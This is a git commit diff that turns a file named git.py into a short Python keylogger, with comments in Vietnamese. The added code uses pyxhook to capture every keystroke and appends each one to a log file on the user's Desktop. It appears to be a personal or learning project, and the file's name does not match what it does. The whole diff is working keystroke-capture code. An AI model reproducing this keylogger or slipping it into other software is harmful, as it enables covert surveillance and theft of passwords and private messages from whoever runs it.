e0ec8c8b8cc5f088f528b0c924f34012df3aa4cc
phuc coi <phuccoi996@gmail.com>
2017-05-06 23:24:42 -0700

    Third commit

--- git.py
+++ git.py
@@ -1,7 +1,26 @@
 #!/usr/bin/env python
-# -*- coding: utf-8 -*-
-import sys
-import os
+import os  #import sys || os for linux and sys for windows
+import pyxhook
 
-if __name__ == "__main__":
-    main(*sys.argv)
+#Tao file log va location
+log_file = os.environ.get(
+    'pylogger_file',
+    os.path.expanduser('~/Desktop/filelogg.log')
+)# ham get() dung khi printing key, co ich khi dung default
+#"Desktop" in os.environ kiem tra neu ton tai key (tra ve ket qua true or false)
+def OnkeyPress(event):
+	with open(log_file, 'a' ) as f:
+		f.write('{}\n'.format(event.key))
+
+ghi_hook = pyxhook.HookManager()
+ghi_hook.keyDown = OnkeyPress
+ghi_hook.HookKeyboard()
+try:
+	ghi_hook.start()
+except KeyboardInterrupt:
+	pass
+except Exception as ex:
+	msg = 'Loi trong khi bat su kien\n {} '.format(ex)
+	pyxhook.print_err(msg)
+	with open(log_file, 'a') as f:
+		f.write('\n{}'.format(msg))
